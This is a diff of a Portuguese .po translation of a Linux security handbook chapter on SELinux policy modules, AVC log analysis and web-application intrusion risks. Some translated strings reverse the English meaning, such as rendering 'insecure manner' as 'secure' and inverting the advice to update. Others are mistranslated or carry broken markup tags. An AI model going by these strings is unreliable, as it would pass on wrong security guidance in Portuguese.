 msgid "The SELinux “interfaces” are only macro functions which will be substituted by a set of rules at compilation time. Likewise, some rights are in fact sets of rights which are replaced by their values at compilation time."
 msgstr ""
+"As \"interfaces\" SELinux são apenas funções de macro que serão substituídas "
+"por uma série de regras no momento da compilação. Da mesma forma, alguns "
+"direitos são conjuntos de fatos de direitos que são substituídos por seus "
+"valores em tempo de compilação."
 
 #. Tag: programlisting
 #, no-c-format
@@ -2400,457 +2698,791 @@ msgid "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
 "files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 ""
 msgstr ""
+"policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Declaracoes\n"
+"#\n"
+"\n"
+"type myapp_t; <co id=\"example.te.type\"></co>\n"
+"type myapp_exec_t;\n"
+"domain_type(myapp_t)\n"
+"domain_entry_file(myapp_t, myapp_exec_t) <co id=\"example.te.domain\"></co>\n"
+"\n"
+"type myapp_log_t;\n"
+"logging_log_file(myapp_log_t) <co id=\"example.te.interface\"></co>\n"
+"\n"
+"type myapp_tmp_t;\n"
+"files_tmp_file(myapp_tmp_t)\n"
+"\n"
+"########################################\n"
+"#\n"
+"# Politica local Myapp \n"
+"#\n"
+"\n"
+"allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co "
+"id=\"example.te.allow\"></co>\n"
+"\n"
+"allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
+"files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "The module must be identified by its name and version number. This directive is required."
 msgstr ""
+"O modulo deve ser identificado pelo seu nome e numero da versao. Esta "
+"diretiva é requerida."
 
 #. Tag: para
 #, no-c-format
 msgid "If the module introduces new types, it must declare them with directives like this one. Do not hesitate to create as many types as required rather than granting too many useless rights."
 msgstr ""
+"Se o módulo introduz novos tipos, deve declará-los com as directivas como "
+"este. Não hesite em criar tantos tipos quantas forem necessários em vez de "
+"conceder muitos direitos inúteis."
 
 #. Tag: para
 #, no-c-format
 msgid "Those interfaces define the <literal>myapp_t</literal> type as a process domain that should be used by any executable labeled with <literal>myapp_exec_t</literal>. Implicitly, this adds an <literal>exec_type</literal> attribute on those objects, which in turn allows other modules to grant rights to execute those programs: for instance, the <literal>userdomain</literal> module allows processes with domains <literal>user_t</literal>, <literal>staff_t</literal>, and <literal>sysadm_t</literal> to execute them. The domains of other confined applications will not have the rights to execute them, unless the rules grant them similar rights (this is the case, for example, of <command>dpkg</command> with its <literal>dpkg_t</literal> domain)."
 msgstr ""
+"Estas interfaces definem o tipo <literal>myapp_t</literal> como uma área "
+"processo que deve ser utilizada por qualquer executável rotulado com "
+"<literal>myapp_exec_t</literal>. Implicitamente, isso adiciona um atributo "
+"<literal>exec_type</literal> sobre esses objetos, que por sua vez permite "
+"que outros módulos de concessão de direitos para executar esses programas: "
+"por exemplo, o módulo <literal>userdomain</literal>, permite que os "
+"processos com domínios <literal>user_t</literal>, <literal>staff_t</literal> "
+"e <literal>sysadm_t</literal> execute os. Os domínios de outras aplicações "
+"confinadas não terão direitos para executar los, a menos que as regras lhes "
+"concedem direitos semelhantes (este é o caso, por exemplo, do dpkg com o seu "
+"domínio dpkg_t)."
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>logging_log_file</literal> is an interface provided by the reference policy. It indicates that files labeled with the given type are log files which ought to benefit from the associated rules (for example granting rights to <command>logrotate</command> so that it can manipulate them)."
 msgstr ""
+"<literal>logging_log_file</literal> é uma interface fornecida pela política "
+"de referência. Ela indica que os arquivos marcados com o tipo de dado são "
+"arquivos de log que deveriam beneficiar das regras associadas (por exemplo "
+"concedem direitos ao <command>logrotate</command> para que possa manipulá "
+"los)."
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>allow</literal> directive is the base directive used to authorize an operation. The first parameter is the process domain which is allowed to execute the operation. The second one defines the object that a process of the former domain can manipulate. This parameter is of the form “<replaceable>type</replaceable>:<replaceable>class</replaceable>“ where <replaceable>type</replaceable> is its SELinux type and <replaceable>class</replaceable> describes the nature of the object (file, directory, socket, fifo, etc.). Finally, the last parameter describes the permissions (the allowed operations)."
 msgstr ""
+"O diretiva <literal>permicao</literal> é a diretiva de base utilizada para "
+"autorizar uma operação. O primeiro parâmetro é o domínio processo que tem a "
+"permissao para executar a operação. A segunda define o objeto que um "
+"processo do domínio anterior pode manipular. Este parâmetro é a forma "
+"\"<replaceable>tipo</replaceable>: <replaceable>classe</replaceable>\" onde "
+"<replaceable>tipo</replaceable> é o seu tipo SELinux e "
+"<replaceable>classe</replaceable> descreve a natureza do objeto (arquivo, "
+"diretório, socket, fifo, etc.) Finalmente, o último parâmetro descreve as "
+"permissões (as operações permitidas)."
 
 #. Tag: para
 #, no-c-format
 msgid "Permissions are defined as the set of allowed operations and follow this template: <literal>{ <replaceable>operation1</replaceable> <replaceable>operation2</replaceable> }</literal>. However, you can also use macros representing the most useful permissions. The <filename>/usr/share/selinux/default/include/support/obj_perm_sets.spt</filename> lists them."
 msgstr ""
+"As permissões são definidas como o conjunto de operações permitidas e segue "
+"este modelo: <literal>{ <replaceable>operacao1</replaceable><replaceable>ope"
+"racao2</replaceable>}</literal>. No entanto, você também pode usar macros "
+"que representam as permissões mais úteis. O <filename>/usr/share/selinux/def"
+"ault/include/support/obj_perm_sets.spt</filename> os lista."
 
 #. Tag: para
 #, no-c-format
 msgid "The following web page provides a relatively exhaustive list of object classes, and permissions that can be granted. <ulink type=\"block\" url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 msgstr ""
+"A página web a seguir fornece uma lista relativamente exaustiva de classes "
+"de objetos e permissões que podem ser concedidas. <ulink type=\"block\" "
+"url=\"http://www.selinuxproject.org/page/ObjectClassesPerms\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Now you just have to find the minimal set of rules required to ensure that the target application or service works properly. To achieve this, you should have a good knowledge of how the application works and of what kind of data it manages and/or generates."
 msgstr ""
+"Agora você só tem que encontrar o conjunto mínimo de regras necessárias para "
+"assegurar que o aplicativo de destino ou serviço funcione corretamente. "
+"Para conseguir isso, você deve ter um bom conhecimento de como o aplicativo "
+"funciona e de que tipo de dados ele gerencia e/ou gera."
 
 #. Tag: para
 #, no-c-format
 msgid "However, an empirical approach is possible. Once the relevant objects are correctly labeled, you can use the application in permissive mode: the operations that would be forbidden are logged but still succeed. By analyzing the logs, you can now identify the operations to allow. Here is an example of such a log entry:"
 msgstr ""
+"No entanto, uma abordagem empírica é possível. Uma vez que os objetos "
+"relevantes são rotuladas corretamente, você pode usar o aplicativo no modo "
+"permissivo: as operações que seriam proibidos são registrados, mas ainda tem "
+"sucesso. Ao analisar os logs, você pode agora identificar as operações de "
+"permissao. Aqui esta um exemplo de uma tal entrada de log:"
 
 #. Tag: programlisting
 #, no-c-format
 msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
 ""
-msgstr ""
+msgstr "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" "
+"dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 "
+"tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
 
 #. Tag: para
 #, no-c-format
 msgid "To better understand this message, let us study it piece by piece."
-msgstr ""
+msgstr "Para melhor entender esta mensagem, vamos estudá la peça por peça."
 
 #. Tag: title
 #, no-c-format
 msgid "Analysis of an SELinux trace"
-msgstr ""
+msgstr "Análise de um rastreamento SELinux"
 
 #. Tag: entry
 #, no-c-format
 msgid "Message"
-msgstr ""
+msgstr "Mensagem"
 
 #. Tag: entry
 #, no-c-format
 msgid "Description"
-msgstr ""
+msgstr "Descricao"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>avc: denied</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>avc: denied</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "An operation has been denied."
-msgstr ""
+msgstr "Uma operação foi negada."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>{ read write }</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>{ read write }</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This operation required the <literal>read</literal> and <literal>write</literal> permissions."
 msgstr ""
+"Esta operação exigiu permissões de  <literal>leitura</literal> e "
+"<literal>escrita</literal>."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>pid=1876</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>pid=1876</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process with PID 1876 executed the operation (or tried to execute it)."
-msgstr ""
+msgstr "O processo com PID 1876 executou a operacao (ou tentou executa la)."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>comm=\"syslogd\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>comm=\"syslogd\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process was an instance of the <literal>syslogd</literal> program."
-msgstr ""
+msgstr "O processo foi um exemplo do programa <literal>syslogd</literal>."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>name=\"xconsole\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>name=\"xconsole\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object was named <literal>xconsole</literal>."
-msgstr ""
+msgstr "O objeto de destino foi nomeado <literal>xconsole</literal>."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>dev=tmpfs</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>dev=tmpfs</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “hda3”)."
 msgstr ""
+"O dispositivo que hospeda o objeto de destino é um <literal>tmpfs</literal> "
+"(um sistema de arquivos em memória). Para um disco real, você poderia ver a "
+"partição que hospeda o objeto (por exemplo: \"hda3\")."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>ino=5510</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>ino=5510</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The object is identified by the inode number 5510."
-msgstr ""
+msgstr "O objeto esta identificado pelo inode numero 5510."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 msgstr ""
+"<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the process who executed the operation."
-msgstr ""
+msgstr "Este é o contexto de segurança do processo que executou a operação."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the target object."
-msgstr ""
+msgstr "Este é o contexto de segurança do objeto destino."
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tclass=fifo_file</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tclass=fifo_file</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object is a FIFO file."
-msgstr ""
+msgstr "O objeto destino é um arquivo FIFO."
 
 #. Tag: para
 #, no-c-format
 msgid "By observing this log entry, it is possible to build a rule that would allow this operation. For example: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. This process can be automated, and it's exactly what the <command>audit2allow</command> command (of the <emphasis role=\"pkg\">policycoreutils</emphasis> package) offers. This approach is only useful if the various objects are already correctly labeled according to what must be confined. In any case, you will have to carefully review the generated rules and validate them according to your knowledge of the application. Effectively, this approach tends to grant more rights than are really required. The proper solution is often to create new types and to grant rights on those types only. It also happens that a denied operation isn't fatal to the application, in which case it might be better to just add a “<literal>dontaudit</literal>” rule to avoid the log entry despite the effective denial."
 msgstr ""
+"Ao observar essa entrada de log, é possível construir uma regra que permite "
+"esta operação. Por exemplo: <literal>allow syslogd_t device_t:fifo_file { "
+"read write }</literal>. Este processo pode ser automatizado, e é exatamente "
+"o que o comando <command>audit2allow</command> oferece (do pacote <emphasis "
+"role=\"pkg\">policycoreutils</emphasis>). Esta abordagem só é útil se os "
+"vários objetos já estão corretamente rotulados de acordo com o que deve ser "
+"confinado. Em qualquer caso, você terá que analisar cuidadosamente as regras "
+"geradas e as validar de acordo com o seu conhecimento da aplicacao. "
+"Efetivamente, essa abordagem tende a conceder mais direitos do que são "
+"realmente necessários. A solução adequada é muitas vezes criar novos tipos "
+"de concessão de direitos apenas sobre esses tipos. Acontece também de uma "
+"operação negada não ser fatal para a aplicação, neste caso pode ser melhor "
+"adicionar uma regra \"<literal>dontaudit</literal>\" para evitar a entrada de "
+"log, apesar da efetiva negação."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>COMPLEMENTS</emphasis> No roles in policy rules"
-msgstr ""
+msgstr "<emphasis>COMPLEMENTOS</emphasis> Nao ha papeis nas regras de politicas"
 
 #. Tag: para
 #, no-c-format
 msgid "It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights. <indexterm><primary>Type Enforcement</primary></indexterm> <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>"
 msgstr ""
+"Pode parecer estranho que os papéis não aparecem em tudo ao criar novas "
+"regras. SELinux utiliza apenas os domínios para descobrir quais operações "
+"são permitidas. A intervenção do papel apenas de forma indireta, permitindo "
+"ao usuário alternar para outro domínio. SELinux é baseado em uma teoria "
+"conhecida como <emphasis>Tipo de aplicacao</emphasis> e o tipo é o único "
+"elemento que importa na concessão de direitos. <indexterm><primary>Tipo de "
+"aplicacao</principal></indexterm><indexterm><primary>Aplicacao, Tipo de "
+"aplicacai</principal></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Compiling the Files"
-msgstr ""
+msgstr "Compilando os Arquivos"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files."
 msgstr ""
+"Uma vez que os 3 arquivos (<filename>example.if</filename>, "
+"<filename>example.fc</filename>, e <filename>example.te</filename>) "
+"correspondem às suas expectativas para as novas regras, basta executar "
+"<comando>make</command> para gerar um módulo no arquivo <filename>example.pp "
+"file></filename> (você pode o carregar imediatamente com <command>semodule "
+"-i example.pp</command>). Se vários módulos são definidos, "
+"<command>make</command> irá criar todos os arquivos correspondentes "
+"<filename>.pp</ filename>."
 
 #. Tag: title
 #, no-c-format
 msgid "Other Security-Related Considerations"
-msgstr ""
+msgstr "Outras Consideracoes Relacionadas a Seguranca"
 
 #. Tag: para
 #, no-c-format
 msgid "Security is not just a technical problem; more than anything, it's about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack."
 msgstr ""
+"Segurança não é apenas um problema técnico, mais do que qualquer coisa, é "
+"sobre as boas práticas e compreencao dos riscos. Esta seção examina alguns "
+"dos riscos mais comuns, bem como algumas das melhores práticas que deverao, "
+"dependendo do caso, aumentar a segurança ou diminuir o impacto de um ataque "
+"bem sucedido."
 
 #. Tag: title
 #, no-c-format
 msgid "Inherent Risks of Web Applications"
-msgstr ""
+msgstr "Riscos Inerentes a Aplicações Web"
 
 #. Tag: para
 #, no-c-format
 msgid "The universal character of web applications led to their proliferation. Several are often run in parallel: a webmail, a wiki, some groupware system, forums, a photo gallery, a blog, and so on. Many of those applications rely on the “LAMP” (<emphasis>Linux, Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those applications were also written without much consideration for security problems. Data coming from outside is, too often, used with little or no validation. Providing specially-crafted values can be used to subvert a call to a command so that another one is executed instead. Many of the most obvious problems have been fixed as time has passed, but new security problems pop up regularly."
 msgstr ""
+"O caráter universal das aplicações web levou à sua proliferação. Diversas "
+"são freqüentemente executadas em paralelo: um webmail, um wiki, algum "
+"sistema de groupware, fóruns, uma galeria de fotos, um blog, e assim por "
+"diante. Muitas dessas aplicações dependem da pilha \"LAMP\" (<emphasis>Linux, "
+"Apache, MySQL, PHP</emphasis>). Infelizmente, muitas dessas aplicações "
+"também foram escritas sem considerar muito os problemas de segurança. Dados "
+"provenientes do exterior são, muitas vezes, utilizados com pouca ou nenhuma "
+"validação. Proporcionando valores criados especialmente para serem usados "
+"​​para destruir uma chamada para um comando de modo que um outro seja "
+"executado em vez disso. Muitos dos problemas mais óbvios foram corrigidos "
+"com o parrar do tempo, mas novos problemas de segurança surgem regularmente."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> SQL injection"
-msgstr ""
+msgstr "<emphasis>VOCABULARIO</emphasis> SQL injection"
 
 #. Tag: para
 #, no-c-format
 msgid "When a program inserts data into SQL queries in an insecure manner, it becomes vulnerable to SQL injections; this name covers the act of changing a parameter in such a way that the actual query executed by the program is different from the intended one, either to damage the database or to access data that should normally not be accessible. <ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
 msgstr ""
+"Quando um programa insere dados em consultas SQL de uma maneira segura, "
+"torna-se vulnerável a SQL injections; este nome abrange o ato de alterar um "
+"parâmetro de tal forma que a consulta real executada pelo programa é "
+"diferente da pretendida, quer para danificar o banco de dados ou de acesso "
+"aos dados que normalmente não devem ser acessíveis. <ulink type=\"block\" "
+"url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SQL injection</primary>"
-msgstr ""
+msgstr "<primary>SQL injection</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Updating web applications regularly is therefore a must, lest any cracker (whether a professional attacker or a script kiddy) can exploit a known vulnerability. The actual risk depends on the case, and ranges from data destruction to arbitrary code execution, including web site defacement."
 msgstr ""
+"Atualizar aplicações web regularmente é, portanto, uma obrigação, para que "
+"qualquer cracker (se um atacante ou um profissional script kiddy) possa "
+"explorar uma vulnerabilidade conhecida. O risco real depende do caso, e "
+"varia de destruição de dados a execução de código arbitrário, incluindo "
+"desfiguração do site."
 
 #. Tag: title
 #, no-c-format
 msgid "Knowing What To Expect"
-msgstr ""
+msgstr "Sabendo O Que Esperar"
 
 #. Tag: para
 #, no-c-format
 msgid "A vulnerability in a web application is often used as a starting point for cracking attempts. What follows is a short review of possible consequences."
 msgstr ""
+"A vulnerabilidade em uma aplicação web é frequentemente utilizada como ponto "
+"de partida para as tentativas de craqueamento. O que se segue são uma breve "
+"revisão das possíveis consequências."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> Filtering HTTP queries"
-msgstr ""
+msgstr "<emphasis>OLHADA RAPIDA</emphasis> Filtrando consultas HTTP"
 
 #. Tag: para
 #, no-c-format
 msgid "Apache 2 includes modules allowing filtering incoming HTTP queries. This allows blocking some attack vectors. For instance, limiting the length of parameters can prevent buffer overflows. More generally, one can validate parameters before they are even passed to the web application and restrict access along many criteria. This can even be combined with dynamic firewall updates, so that a client infringing one of the rules is banned from accessing the web server for a given period of time."
 msgstr ""
+"Apache 2 inclui módulos que permitindo a filtragem da entrada de consultas "
+"HTTP. Isto permite o bloqueio de alguns vetores de ataque. Por exemplo, "
+"limitando a duração dos parâmetros pode impedir o estouro do buffer. Mais "
+"genericamente, pode se validar os parâmetros antes mesmo que eles passem "
+"para a aplicação web e restringir o acesso ao longo de muitos critérios. "
+"Isso pode até ser combinado com atualizações dinâmicas do firewall, de modo "
+"que se um cliente violar uma das regras é proibido de acessar o servidor web "
+"por um determinado tempo."
 
 #. Tag: para
 #, no-c-format
 msgid "Setting up these checks can be a long and cumbersome task, but it can pay off when the web application to be deployed has a dubious track record where security is concerned."
 msgstr ""
+"Configurando estas verificações podem ser uma tarefa longa e complicada, mas "
+"pode pagar quando a aplicação web a ser implantada tiver um histórico "
+"duvidoso, onde a segurança é interesse."
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>mod-security</emphasis> (in the <emphasis role=\"pkg\">libapache-mod-security</emphasis> package) is the main such module."
 msgstr ""
+"<emphasis>mod-security</emphasis> (no pacote <emphasis role=\"pkg\">libapache-"
+"mod-security</emphasis>) é o tal módulo principal."
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 msgstr ""
+"<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>mod-security</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>mod-security</emphasis></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The consequences of an intrusion will have various levels of obviousness depending on the motivations of the attacker. <emphasis>Script-kiddies</emphasis> only apply recipes they find on web sites; most often, they deface a web page or delete data. In more subtle cases, they add invisible contents to web pages so as to improve referrals to their own sites in search engines."
 msgstr ""
+"As consequências de uma invasão terá vários níveis de evidência, dependendo "
+"das motivações do atacante. <emphasis>Script-kiddies</emphasis> só aplicam "
+"receitas que encontram em sites, a maioria das vezes, eles desfigurar uma "
+"página web ou excluir dados. Em casos mais sutis, eles adicionam conteúdo "
+"invisíveis para páginas web, de modo a melhorar encaminhamentos para seus "
+"próprios sites em motores de busca."
 
 #. Tag: para
 #, no-c-format
 msgid "A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to follow the scent to the actual origin of the attack."
 msgstr ""
+"Um atacante mais avançado vai além disso. Um cenário de desastre poderia "
+"continuar da seguinte maneira: o atacante ganha a habilidade de executar "
+"comandos como o usuário <literal>www-data</literal>, mas a execução de um "
+"comando requer muitas manipulações. Para tornar sua vida mais fácil, eles "
+"instalam outras aplicações web especialmente concebidas para executar "
+"remotamente vários tipos de comandos, como a navegação no sistema de "
+"arquivos, examinando as permissões de upload, ou download de arquivos, "
+"execução de comandos, e até mesmo fornecer um escudo de rede. Muitas vezes, "
+"a vulnerabilidade permite execução de um <command>wget</command> que vai "
+"baixar algum malware em <filename>/tmp/</filename>, então o executa. O "
+"malware geralmente é baixado de um site estrangeiro que foi previamente "
+"comprometido, a fim de cobrir faixas e tornar mais difícil rastrear a "
+"verdadeira origem do ataque."
 
 #. Tag: para
 #, no-c-format
 msgid "At this point, the attacker has enough freedom of movement that they often install an IRC <emphasis>bot</emphasis> (a robot that connects to an IRC server and can be controlled by this channel). This bot is often used to share illegal files (unauthorized copies of movies or software, and so on). A determined attacker may want to go even further. The <literal>www-data</literal> account does not allow full access to the machine, and the attacker will try to obtain administrator privileges. Now, this should not be possible, but if the web application was not up-to-date, chances are that the kernel and other programs are outdated too; this sometimes follows a decision from the administrator who, despite knowing about the vulnerability, neglected to upgrade the system since there are no local users. The attacker can then take advantage of this second vulnerability to get root access."
 msgstr ""
+"Neste ponto, o invasor tem bastante liberdade de movimento que muitas vezes "
+"instalar um robô IRC (um robô que se conecta a um servidor IRC e pode ser "
+"controlado por este canal). Este robô é freqüentemente usado para "
+"compartilhamento de arquivos ilegais (cópias não autorizadas de filmes ou "
+"software, entre outros). Um determinado invasor pode querer ir ainda mais "
+"longe. O conta <literal>www-data</literal> não permite o acesso total à "
+"máquina, e o invasor vai tentar obter privilégios de administrador. Ora, "
+"isso não deve ser possível, mas se a aplicação web não está atualizada, as "
+"chances são de que os programas do kernel e outros também estejam "
+"desatualizados, o que às vezes se segue uma decisão do administrador que, "
+"apesar de saber sobre a vulnerabilidade, negligenciado para atualizar o "
+"sistema, pois não existem usuários locais. O atacante pode então aproveitar "
+"essa segunda vulnerabilidade para obter acesso root."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Privilege escalation"
-msgstr ""
+msgstr "<emphasis>VOCABULARIO</emphasis> Escalonamento de Privilégios"
 
 #. Tag: para
 #, no-c-format
 msgid "This term covers anything that can be used to obtain more permissions than a given user should normally have. The <command>sudo</command> program is designed for precisely the purpose of giving administrative rights to some users. But the same term is also used to describe the act of an attacker exploiting a vulnerability to obtain undue rights."
 msgstr ""
+"Este termo abrange qualquer coisa que pode ser usada para obter as "
+"permissões de mais do que um determinado utilizador deve ter normalmente. O "
+"programa <command>sudo</command> é projetado justamente com o proposito de "
+"dar direitos administrativos para alguns usuários. Mas o termo também é "
+"usado para descrever o ato de um invasor explorar uma vulnerabilidade para "
+"obter direitos indevidos."
 
 #. Tag: para
 #, no-c-format
 msgid "Now the attacker owns the machine; they will usually try to keep this privileged access for as long as possible. This involves installing a <emphasis>rootkit</emphasis>, a program that will replace some components of the system so that the attacker will be able to obtain the administrator privileges again at a later time; the rootkit also tries hiding its own existence as well as any traces of the intrusion. A subverted <command>ps</command> program will omit to list some processes, <command>netstat</command> will not list some of the active connections, and so on. Using the root permissions, the attacker was able to observe the whole system, but didn't find important data; so they will try accessing other machines in the corporate network. Analyzing the administrator's account and the history files, the attacker finds what machines are routinely accessed. By replacing <command>sudo</command> or <command>ssh</command> with a subverted program, the attacker can intercept some of the administrator's passwords, which they will use on the detected servers… and the intrusion can propagate from then on."
 msgstr ""
+"Agora, o atacante é dono da máquina; eles costumam tentar manter esse acesso "
+"privilegiado pelo maior tempo possível. Isso envolve a instalação de um "
+"<emphasis>rootkit</emphasis>, um programa que irá substituir alguns "
+"componentes do sistema para que o invasor seja capaz de obter os privilégios "
+"de administrador novamente em um momento posterior, o rootkit também tenta "
+"esconder a sua própria existência como tambem quaisquer vestígios da "
+"intrusão. U subvertido programa <command>ps</command> irá deixar de listar "
+"alguns processos, <command>netstat</command> não vai listar algumas das "
+"conexões ativas e assim por diante. Usando as permissões de root, o invasor "
+"foi capaz de observar todo o sistema, mas não encontrou dados importantes, "
+"então vai tentar acessar outras máquinas na rede corporativa. Analisando a "
+"conta do administrador e os arquivos de histórico, o atacante acha que as "
+"máquinas são acessadas rotineiramente. Ao substituir <command>sudo</command> "
+"ou <command>ssh</command> com um programa subvertido, o invasor pode "
+"interceptar algumas das senhas do administrador, que irá utilizar nos "
+"servidores detectados ... e a intrusão pode se propagar a partir de então."
 
 #. Tag: para
 #, no-c-format
 msgid "This is a nightmare scenario which can be prevented by several measures. The next few sections describe some of these measures."
 msgstr ""
+"Este é um cenário de pesadelo pode ser evitado através de várias medidas. As "
+"próximas seções descrevem algumas dessas medidas."
 
 #. Tag: title
 #, no-c-format
 msgid "Choosing the Software Wisely"
-msgstr ""
+msgstr "Escolhendo o Software Sabiamente"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the potential security problems are known, they must be taken into account at each step of the process of deploying a service, especially when choosing the software to install. Many web sites, such as <literal>SecurityFocus.com</literal>, keep a list of recently-discovered vulnerabilities, which can give an idea of a security track record before some particular software is deployed. Of course, this information must be balanced against the popularity of said software: a more widely-used program is a more tempting target, and it will be more closely scrutinized as a consequence. On the other hand, a niche program may be full of security holes that never get publicized due to a lack of interest in a security audit."
 msgstr ""
+"Uma vez que os problemas potenciais de segurança são conhecidos, eles devem "
+"ser levados em conta, em cada passo do processo de implantação de um "
+"serviço, especialmente quando se escolhe o software para instalar. Muitos "
+"sites, como <literal>SecurityFocus.com</literal>, mantem uma lista de "
+"vulnerabilidades recém-descobertas, que podem dar uma idéia de um histórico "
+"de segurança antes de algum software especial ser implantado. Claro, essa "
+"informação deve ser equilibrada com a popularidade do referido software: um "
+"programa mais amplamente usado é um alvo mais tentador, e será examinado "
+"mais de perto como conseqüência. Por outro lado, um programa de nicho pode "
+"estar cheio de buracos de segurança que nunca serao divulgados devido a uma "
+"falta de interesse em uma auditoria de segurança."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Security audit"
-msgstr ""
+msgstr "<emphasis>VOCABULARIO</emphasis> Auditoria de Seguranca"
 
 #. Tag: para
 #, no-c-format
 msgid "A security audit is the process of thoroughly reading and analyzing the source code of some software, looking for potential security vulnerabilities it could contain. Such audits are usually proactive and they are conducted to ensure a program meets certain security requirements."
 msgstr ""
+"A auditoria de segurança é o processo de leitura cuidadosa e analise do "
+"código fonte de algum software, procurando por vulnerabilidades de segurança "
+"em potencial que poderiam conter. Estas auditorias são geralmente "
+"pró-ativas e são realizadas para garantir que um programa atenda aos "
+"requisitos de segurança determinados."
 
 #. Tag: para
 #, no-c-format
 msgid "In the Free Software world, there is generally ample room for choice, and choosing one piece of software over another should be a decision based on the criteria that apply locally. More features imply a increased risk of a vulnerability hiding in the code; picking the most advanced program for a task may actually be counter-productive, and a better approach is usually to pick the simplest program that meets the requirements."
 msgstr ""
+"No mundo do Software Livre, geralmente há um amplo espaço para a escolha, e "
+"escolher um pedaço de software em detrimento de outro deve ser uma decisão "
+"com base nos critérios que se aplicam localmente. Mais características "
+"implicam num aumento do risco de um vulnerabilidade escondida no código; "
